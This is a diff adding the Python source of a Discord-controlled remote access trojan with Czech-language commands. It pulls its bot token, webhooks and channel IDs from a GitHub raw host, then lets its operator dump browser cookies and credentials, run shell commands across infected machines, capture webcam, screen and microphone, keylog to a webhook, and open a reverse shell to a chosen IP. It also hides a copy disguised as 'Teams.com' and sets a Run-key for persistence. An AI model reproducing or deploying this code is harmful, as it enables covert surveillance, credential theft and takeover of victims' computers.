@@ -1,0 +1,570 @@
+import discord
+from discord.ext import commands
+from discord import app_commands
+from discord.ext import tasks
+import os
+import subprocess as sp
+import requests
+import random
+from cv2 import VideoCapture
+from cv2 import imwrite
+import cv2
+from scipy.io.wavfile import write
+from sounddevice import rec, wait
+import platform
+import re
+import aiohttp
+from urllib.request import Request, urlopen
+import pyautogui
+from datetime import datetime
+import shutil
+import sys
+import sqlite3
+import pyaudio
+from multiprocessing import Process
+import subprocess
+import tkinter as tk
+import threading
+import json
+import ctypes
+from ctypes.wintypes import HKEY
+import time
+from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
+import win32api
+import win32process
+import psutil
+import win32pdh
+from winreg import *
+from ctypes import *
+import asyncio
+import base64
+import login, keybinds, execute
+from moviepy.editor import VideoFileClip
+import win32api
+import win32con
+import win32gui
+import winsound
+import socket
+from ctypes import cast, POINTER
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+import tempfile
+import numpy as np
+
+
+
+def SystemPath():
+    global path
+
+    full_path = os.path.realpath(__file__)
+    path, filename = os.path.split(full_path)
+SystemPath()
+
+def GET_FRONTMAN_ROLE():
+    global mention
+    url = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/role.get"
+    response = requests.get(url)
+    
+    if response.status_code == 200:
+        role_id = response.text.strip()
+        mention = f"<@&{role_id}>"
+    else:
+        mention = "@Neznámá role" 
+GET_FRONTMAN_ROLE()
+def GET_CURRENT_AGENT():
+    global CURRENT_AGENT
+    Čúrak = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/%C4%8D%C3%BArak.get"
+    Čúrak_GET = requests.get(Čúrak).text
+    CURRENT_AGENT = Čúrak_GET
+GET_CURRENT_AGENT()
+def GET_MAIN_CHANNEL():
+    global CHANNEL
+    Chónl = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/kan%C3%A1l.get"
+    Chónl_GET = requests.get(Chónl).text
+    CHANNEL = Chónl_GET
+GET_MAIN_CHANNEL()
+def GET_KEYLOGGER_WEBHOOK():
+    global KEYLOGGER_WEBHOOK
+    Víwhook = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/kl%C3%A1vesnice.get"
+    Víwhook_GET = requests.get(Víwhook).text
+    KEYLOGGER_WEBHOOK = "https://discord.com/api/webhooks/"+Víwhook_GET
+GET_KEYLOGGER_WEBHOOK()
+def GET_VIDEO_WEBHOOK():
+    global VIDEO_WEBHOOK
+    Víwhook = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/video.get"
+    Víwhook_GET = requests.get(Víwhook).text
+    VIDEO_WEBHOOK = "https://discord.com/api/webhooks/"+Víwhook_GET
+GET_VIDEO_WEBHOOK()
+def GET_GUILD():
+    global GUILD
+    Gíol = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/guild.get"
+    Gíol_GET = requests.get(Gíol).text.strip()  # Odstraní mezery a nové řádky
+    GUILD = int(Gíol_GET)  # Převede na číslo
+GET_GUILD()
+def GET_FILEMONITOR_CHANNEL():
+    global FILEMONITOR_CHANNEL
+    Chónl = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/FileControlChannel.get"
+    Chónl_GET = requests.get(Chónl).text.strip()
+    FILEMONITOR_CHANNEL = int(Chónl_GET)
+GET_FILEMONITOR_CHANNEL()
+
+def GET_TOKEN():
+    global TOKEN
+    Mezopotámie = "https://raw.githubusercontent.com/miskajurostudios/GET/main/Br%C3%B3/Mezopot%C3%A1mie.get"
+    Mezopotámie_GET = requests.get(Mezopotámie).text
+    TOKEN_GENERATION_ONE = Mezopotámie_GET
+    TOKEN_GENERATION_TWO = base64.b64decode(TOKEN_GENERATION_ONE).decode()
+    TOKEN_GENERATION_THREE = base64.b64decode(TOKEN_GENERATION_TWO).decode()
+    TOKEN_GENERATION_FOUR = base64.b64decode(TOKEN_GENERATION_THREE).decode()
+    TOKEN = base64.b64decode(TOKEN_GENERATION_FOUR).decode()
+GET_TOKEN()
+
+class Bot(commands.Bot):
+    def __init__(self):
+        intents = discord.Intents.default()
+        intents.message_content = True
+        super().__init__(command_prefix="!", intents=intents, help_command=None)  # Tady už máme intents
+
+    async def on_ready(self):
+        await self.wait_until_ready()
+    
+        self.channel = self.get_channel(CHANNEL)
+        if self.channel is None:
+            return
+
+        now = datetime.now()
+        my_embed = discord.Embed(
+            title=f"{MSG}",
+            description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**",
+            color=COLOR
+        )
+        my_embed.add_field(name="**IP**", value=execute.getIP(), inline=True)
+        my_embed.add_field(name="**Bits**", value=execute.getBits(), inline=True)
+        my_embed.add_field(name="**HostName**", value=execute.getHostname(), inline=True)
+        my_embed.add_field(name="**OS**", value=execute.getOS(), inline=True)
+        my_embed.add_field(name="**Username**", value=execute.getUsername(), inline=True)
+        my_embed.add_field(name="**CPU**", value=execute.getCPU(), inline=False)
+        my_embed.add_field(name="**Is Admin**", value=execute.isAdmin(), inline=True)
+        my_embed.add_field(name="**Is VM**", value=execute.isVM(), inline=True)
+        my_embed.add_field(name="**Auto Keylogger**", value="False", inline=True)
+
+        await self.channel.send(embed=my_embed)
+
+    async def setup_hook(self):
+        await self.tree.sync(guild=discord.Object(id=GUILD))
+
+    async def on_command_error(self, ctx, error):
+        my_embed = discord.Embed(title=f"**Error:** {error}", color=0xFF0000)
+        try:
+            await ctx.send(embed=my_embed)
+        except discord.Forbidden:
+            print("")
+
+
+class InteractButton(discord.ui.View):
+    def __init__(self, inv:str, id:int):
+        super().__init__()
+        self.inv  = inv
+        self.id = id
+
+    @discord.ui.button(label="Interagovat", style=discord.ButtonStyle.blurple, emoji="🔗")
+    async def interactButton(self, interaction:discord.Interaction, button:discord.ui.Button):
+        global CURRENT_AGENT
+        CURRENT_AGENT = self.id
+        await interaction.response.send_message(embed=discord.Embed(title=f"Interacted with agent {self.id}", color=0x00FF00), ephemeral=True)
+
+    @discord.ui.button(label="Terminovat Spojení", style=discord.ButtonStyle.gray, emoji="❌")
+    async def terminateButton(self, interaction:discord.Interaction, button:discord.ui.Button):
+        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{self.id}", color=0x00FF00)
+        await interaction.response.send_message(embed=my_embed)
+        await bot.close()        
+        sys.exit()
+
+    @discord.ui.button(label="Kamera", style=discord.ButtonStyle.gray, emoji="📸")
+    async def webshot(self, interaction:discord.Interaction, button:discord.ui.Button):
+        result = execute.webshot()
+        if result != False:
+            await interaction.response.send_message(file=discord.File(result))
+            os.remove(result)
+        else:
+            my_embed = discord.Embed(title=f"Error while taking photo to Agent#{self.id}", color=0xFF0000)
+            await interaction.response.send_messagey(embed=my_embed)
+
+    @discord.ui.button(label="Processes", style=discord.ButtonStyle.gray, emoji="📊")
+    async def process(self, interaction:discord.Interaction, button:discord.ui.Button):
+        result = execute.process()
+        if len(result) > 4000:
+            path = os.environ["temp"] +"\\response.txt"         
+            with open(path, 'w') as file:
+                file.write(result)
+            await interaction.response.send_message(file=discord.File(path))
+            os.remove(path)
+        else:
+            await interaction.response.send_message(f"Result ~ ```\n{result}\n```")
+
+
+    @discord.ui.button(label="Screenshot", style=discord.ButtonStyle.gray, emoji="🖼️")
+    async def screenshot(self, interaction:discord.Interaction, button:discord.ui.Button):
+        result = execute.screenshot()
+        if result != False:
+            await interaction.response.send_message(file=discord.File(result))
+            os.remove(result)
+        else:
+            my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{self.id}", color=0xFF0000)
+            await interaction.response.send_message(embed=my_embed)
+    
+
+    @discord.ui.button(label="Údaje", style=discord.ButtonStyle.gray, emoji="🔑")
+    async def creds(self, interaction:discord.Interaction, button:discord.ui.Button):
+        result = execute.creds()
+        if result != False:
+            await interaction.response.send_message(file=discord.File(result))
+            os.remove(result)
+        else:
+            my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{self.id}", color=0xFF0000)
+            await interaction.response.send_message(embed=my_embed)
+
+    
+    @discord.ui.button(label="Persistence", style=discord.ButtonStyle.gray, emoji="🔁")
+    async def persistent(self, interaction:discord.Interaction, button:discord.ui.Button):
+        result = execute.persistent()
+        if result:
+            my_embed = discord.Embed(title=f"Persistance enabled on Agent#{self.id}", color=0x00FF00)
+        else:
+            my_embed = discord.Embed(title=f"Error while enabling persistance on Agent#{self.id}", color=0xFF0000)
+        await interaction.response.send_message(embed=my_embed)
+
+bot = Bot()
+
+
+@bot.event
+async def on_ready():
+    channel_id = int(CHANNEL)
+    channel = bot.get_channel(channel_id)
+
+    message = f"<< {mention} >>"
+    my_embed = discord.Embed(title=f"[TRIAL ⚡] Agent #{ID} online", description=f"Agent #{ID} je online", color=discord.Color.blue())
+    my_embed.add_field(name=f"**IP Adresa**", value=execute.getIP(), inline=True)
+    my_embed.add_field(name="**Operační System**", value=execute.getOS(), inline=True)
+    my_embed.add_field(name="**Uživatelské Jméno**", value=execute.getUsername(), inline=True)
+    my_view = InteractButton("Interact", ID)
+    await channel.send(message)
+    await channel.send(embed=my_embed, view=my_view)
+
+
+
+
+@bot.hybrid_command(name = "interagovat", with_app_command = True, description = "Interagovat s agentem")
+@app_commands.guilds(GUILD)
+async def cmd(ctx: commands.Context, id:int):
+    global CURRENT_AGENT 
+    CURRENT_AGENT = id
+    my_embed = discord.Embed(title=f"Interaktuješ s agentem #{id}", color=0x00FF00)
+    await ctx.reply(embed=my_embed)
+
+
+
+@bot.hybrid_command(name="dump-cookies", with_app_command=True, description="Dump Chrome/Edge cookies")
+@app_commands.guilds(GUILD)
+async def dump_cookies(ctx):
+    user = os.getlogin()
+    cookies_path = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
+    if not os.path.exists(cookies_path):
+        cookies_path = f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
+    
+    temp_path = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\cookies_dump.db"
+    shutil.copy2(cookies_path, temp_path)
+
+    await ctx.send(file=discord.File(temp_path, "cookies.db"))
+    os.remove(temp_path)
+
+
+
+@bot.hybrid_command(name="hide-infiles", with_app_command=True, description="Schová program do systémových souborů a přidá persistenci")
+@app_commands.guilds(GUILD)
+async def hide_infiles(ctx):
+    backdoor_location = os.environ["APPDATA"] + "\\Teams.com"
+
+    if os.path.exists(backdoor_location):
+        await ctx.send("✅ Již schováno..")
+        return
+
+    try:
+        shutil.copyfile(sys.executable, backdoor_location)
+        sp.call(
+            fr'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "{backdoor_location}" /f',
+            shell=True
+        )
+
+        await ctx.send("✅ Schováno v systémových souborech a přidána persistence.")
+    except Exception as e:
+        await ctx.send(f"❌ Chyba: {e}")
+
+
+
+@bot.hybrid_command(name = "stop-interacting", with_app_command = True, description = "Přestane (background) interagovat s agentem")
+@app_commands.guilds(GUILD)
+async def cmd(ctx: commands.Context):
+    global CURRENT_AGENT 
+    CURRENT_AGENT = 0
+    my_embed = discord.Embed(title=f"Background Agent", color=0x00FF00)
+    await ctx.reply(embed=my_embed)
+
+
+@bot.hybrid_command(name = "cmd", with_app_command = True, description = "Spustí zadaný cmd command.")
+@app_commands.guilds(GUILD)
+async def cmd(ctx: commands.Context, command:str):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = execute.cmd(command)
+        if len(result) > 2000:
+            path = os.environ["temp"] +"\\response.txt"     
+            with open(path, 'w') as file:
+                file.write(result)
+            await ctx.reply(file=discord.File(path))
+            os.remove(path)
+        else:
+            await ctx.reply(f"Result ~ ```{result}```")
+
+
+@bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Spustí zadaný cmd command na všech agentech.")
+@app_commands.guilds(GUILD)
+async def cmd_all(ctx: commands.Context, command:str):
+    result = execute.cmd(command)
+    if len(result) > 2000:
+        path = os.environ["temp"] +"\\response.txt"     
+        with open(path, 'w') as file:
+            file.write(result)
+        await ctx.reply(file=discord.File(path))
+        os.remove(path)
+    else:
+        await ctx.reply(f"Result ~ ```{result}```")
+
+
+@bot.hybrid_command(name = "webcam", with_app_command = True, description = "Pořídí fotku kamery")
+@app_commands.guilds(GUILD)
+async def webshot(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
+        if ctx.interaction:
+            my_embed = discord.Embed(title=f"Prosím použí **!webcam {ID}** místo / commandu", color=0xFF0000)
+            await ctx.reply(embed=my_embed) 
+        else:
+            result = execute.webshot()
+            if result != False:
+                await ctx.reply(file=discord.File(result))
+                os.remove(result)
+            else:
+                my_embed = discord.Embed(title=f"Chyba při pořizování fotky agenta #{ID}", color=0xFF0000)
+                await ctx.reply(embed=my_embed)
+
+
+@bot.hybrid_command(name = "cd", with_app_command = True, description = "Změn umístění (Change Directory) - cmd")
+@app_commands.guilds(GUILD)
+async def cd(ctx: commands.Context, path:str):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = execute.cd(path)
+        if (result):
+            my_embed = discord.Embed(title=f"Úspěšně změněno umístění na: {path}", color=0x00FF00)
+        else:
+            my_embed = discord.Embed(title=f"Chybička při změně umístění:\n{result}", color=0xFF0000)    
+        await ctx.reply(embed=my_embed)
+
+
+@bot.hybrid_command(name = "proc", with_app_command = True, description = "Zobrazí všechny procesy na agentově zařízení")
+@app_commands.guilds(GUILD)
+async def process(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = execute.process()
+        if len(result) > 4000:
+            path = os.environ["temp"] +"\\response.txt"         
+            with open(path, 'w') as file:
+                file.write(result)
+            await ctx.reply(file=discord.File(path))
+            os.remove(path)
+        else:
+            await ctx.reply(f"Result ~ ```\n{result}\n```")
+    
+
+@bot.hybrid_command(name = "upload", with_app_command = True, description = "Nahrát agentovy soubor do zařízení")
+@app_commands.guilds(GUILD)
+async def upload(ctx: commands.Context, url:str, name:str):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = execute.upload(url, name)
+        if result:
+            my_embed = discord.Embed(title=f"{name} bylo úspěšně nahráno k agentovy #{ID}", color=0x00FF00)
+        else:
+            my_embed = discord.Embed(title=f"Error while uploading {name} to Agent#{ID}:\n{result}", color=0xFF0000)
+        await ctx.reply(embed=my_embed)
+
+@bot.hybrid_command(name = "screenshot", with_app_command = True, description = "Pořídí screenshot agentova počítače")
+@app_commands.guilds(GUILD)
+async def screenshot(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = execute.screenshot()
+        if result != False:
+            await ctx.reply(file=discord.File(result))
+            os.remove(result)
+        else:
+            my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{ID}", color=0xFF0000)
+            await ctx.reply(embed=my_embed)
+    
+@bot.hybrid_command(name = "creds", with_app_command = True, description = "Vezme údaje z počítače agenta")
+@app_commands.guilds(GUILD)
+async def creds(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = execute.creds()
+        if result != False:
+            await ctx.reply(file=discord.File(result))
+            os.remove(result)
+        else:
+            my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{ID}", color=0xFF0000)
+            await ctx.reply(embed=my_embed)
+    
+@bot.hybrid_command(name = "persistence", with_app_command = True, description = "Přidá program jako startup k agentovy do registeru")
+@app_commands.guilds(GUILD)
+async def persistent(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = execute.persistent()
+        if result:
+            my_embed = discord.Embed(title=f"Úspěšně přidán program do start-up agentovy#{ID}", color=0x00FF00)
+        else:
+            my_embed = discord.Embed(title=f"Chyba při přidání programu do start-up agentovy#{ID}", color=0xFF0000)
+        await ctx.reply(embed=my_embed)
+    
+@bot.hybrid_command(name = "ls", with_app_command = True, description = "Zobratí všechno online agenty")
+@app_commands.guilds(GUILD)
+async def ls(ctx: commands.Context):
+    if ctx.interaction:
+         my_embed = discord.Embed(title=f"Prosím použí **!ls** mimo '/' commandu.", color=0xFF0000)
+         await ctx.reply(embed=my_embed)
+    else:
+        my_embed = discord.Embed(title=f"Agent #{ID}   IP Adresa: {execute.getIP()}", color=0xADD8E6)
+        my_embed.add_field(name="**Operační System**", value=execute.getOS(), inline=True)
+        my_embed.add_field(name="**Uživatelské Jméno**", value=execute.getUsername(), inline=True)
+        view = InteractButton("Interact", ID)
+        await ctx.reply(embed=my_embed, view=view)
+
+
+@bot.hybrid_command(name = "download", with_app_command = True, description = "Stáhne soubory od agenta")
+@app_commands.guilds(GUILD)
+async def download(ctx: commands.Context, path:str):
+    if (int(CURRENT_AGENT) == int(ID)):
+        try:
+            await ctx.reply(f"**Pokoužíš se stáhnout od agenta #{ID}**:", file=discord.File(path))
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Úspěšně staženy soubory od agenta #{ID}:\n{e}", color=0xFF0000)
+            await ctx.reply(embed=my_embed)
+    
+
+@bot.hybrid_command(name = "terminate", with_app_command = True, description = "Terminuje spojení mezi agentem")
+@app_commands.guilds(GUILD)
+async def download(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
+        my_embed = discord.Embed(title=f"Spojení s agentem #{ID} bylo zastaveno", color=0x00FF00)
+        await ctx.reply(embed=my_embed)
+        await bot.close()        
+        sys.exit()
+    
+
+@bot.hybrid_command(name = "selfdestruct", with_app_command = True, description = "Vymaže agenta ~ sebedestrukce")
+@app_commands.guilds(GUILD)
+async def selfdestruct(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = execute.selfdestruct()
+        if result:
+            my_embed = discord.Embed(title=f"Sebedestrukce agenta #{ID} byla úspěšná", color=0x00FF00)
+        else:
+            my_embed = discord.Embed(title=f"Sebedestrukce agenta #{ID} nebyla úspěšná: {result}", color=0xFF0000)
+        await ctx.reply(embed=my_embed)
+
+    
+@bot.hybrid_command(name = "revshell", with_app_command = True, description = "Vytvoří revshell (ovládaní terminalu nadálku) na agentově počítači")
+@app_commands.guilds(GUILD)
+async def location(ctx: commands.Context, ip:str, port:int):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = execute.revshell(ip, port)
+        if result:
+            my_embed = discord.Embed(title=f"Attempting to Establish Reverse Shell on Agent#{ID}", color=0x00FF00)
+        await ctx.reply(embed=my_embed)
+
+
+@bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Nahrává mikrofon agenta podobu vybraného času")
+@app_commands.guilds(GUILD)
+async def recordmic(ctx: commands.Context, seconds:int):
+    if (int(CURRENT_AGENT) == int(ID)):
+        if ctx.interaction:
+            my_embed = discord.Embed(title="Použí **!recordmic 'time'** místo /recordmic", color=0xFF0000)
+            await ctx.reply(embed=my_embed)
+        else:
+            result = execute.recordmic(seconds)
+            if result != False:
+                await ctx.reply(file=discord.File(result))
+                os.remove(result)
+            else:
+                my_embed = discord.Embed(title=f"Error při pokusu o odposlech agenta #{ID}", color=0xFF0000)
+                await ctx.reply(embed=my_embed)
+
+
+@bot.hybrid_command(name = "killproc", with_app_command = True, description = "Zastaví proces na agentově počítači pomocí PID")
+@app_commands.guilds(GUILD)
+async def killproc(ctx: commands.Context, pid:int):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = execute.killproc(pid)
+        if result:
+            my_embed = discord.Embed(title=f"Process {pid} killed on Agent#{ID}", color=0x00FF00)
+        else:
+            my_embed = discord.Embed(title=f"Error while killing process {pid} on Agent#{ID}", color=0xFF0000)
+        await ctx.reply(embed=my_embed)
+
+
+@bot.hybrid_command(name = "keylog", with_app_command = True, description = "Spustí (nebo zastaví) keylogger na počítači agenta")
+@app_commands.guilds(GUILD)
+async def keylog(ctx: commands.Context, mode:str ,interval:int):
+    if (int(CURRENT_AGENT) == int(ID)):
+        logger = keybinds.Keylogger(interval=interval, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
+        if mode == "stop":
+            logger.stop()
+            await ctx.reply(embed=discord.Embed(title=f"Keylogger stopped on Agent#{ID}", color=0x00FF00))
+        else:
+            threading.Thread(target=logger.start).start()
+            await ctx.reply(embed=discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF000000000000))
+
+
+@bot.hybrid_command(name="shutdown", with_app_command=True, description="Vypne počítač agenta")
+@app_commands.guilds(GUILD)
+async def shutdown(ctx):
+    await ctx.send(f"🛑 **Vypínání počítač agenta #{ID}...**")
+    subprocess.run("shutdown /s /t 5", shell=True)
+
+@bot.hybrid_command(name="restart", with_app_command=True, description="Restartuje počítač agenta")
+@app_commands.guilds(GUILD)
+async def restart(ctx):
+    await ctx.send(f"🔄 **Restartování počítač agenta #{ID}...**")
+    subprocess.run("shutdown /r /t 5", shell=True)
+
+@bot.hybrid_command(name="sleep", with_app_command=True, description="Uspí počítač agenta")
+@app_commands.guilds(GUILD)
+async def sleep(ctx):
+    await ctx.send(f"😴 **Uspávání počítač agenta #{ID}...**")
+    subprocess.run("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)
+
+@bot.hybrid_command(name="logout", with_app_command=True, description="Odhlásí agenta z Windows")
+@app_commands.guilds(GUILD)
+async def logout(ctx):
+    await ctx.send(f"👋 **Odhlašování agenta #{ID} z Windows...**")
+    subprocess.run("shutdown /l", shell=True)
+
+
+
+StartTeams = True
+
+if StartTeams == True:
+    config = execute.createConfig()
+    ID = execute.id()
+    if config:
+        MSG = f"Nový agent se připojil #{ID}"
+        COLOR = 0x00ff00
+    else:
+        MSG =f"Agent se navrátil #{ID}"
+        COLOR = 0x0000FF
+
+    bot.run(f"{TOKEN}")
